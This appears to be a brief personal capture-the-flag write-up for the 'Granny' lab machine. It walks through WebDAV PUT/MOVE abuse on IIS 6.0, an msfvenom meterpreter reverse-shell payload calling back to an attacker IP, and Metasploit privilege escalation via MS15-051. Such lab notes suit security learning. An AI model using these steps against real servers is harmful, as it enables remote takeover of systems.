----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Granny
# 19/3/2023
10.10.10.15

----------------------------------------------------
# nmap
----------------------------------------------------
80/tcp open  http    Microsoft IIS httpd 6.0


----------------------------------------------------
# exploitation
----------------------------------------------------

we can use put and move method in http

└─$ davtest -url http://10.10.10.15/
do it through burp and capture the request





PUT /my.html HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User-Agent: DAV.pm/v0.49
Content-Length: 26

HTML put via davtest<br />






use burp and upload payload and get reverse connection

└─$ msfvenom -p windows/meterpreter/reverse_tcp -ax86 LHOST=10.10.16.2 LPORT=6969 -f aspx 
msf6 exploit(multi/handler) > 

put payload as a html then move as aspx
or
use iis_webdav_upload_asp

you get a shell


----------------------------------------------------
# priv esc
----------------------------------------------------
first migrate the session uder other running procces 
in this casa davcdata.exe
use post/multi/recon/local_exploit_suggester
run

use exploit/windows/local/ms15_051_client_copy_image
run

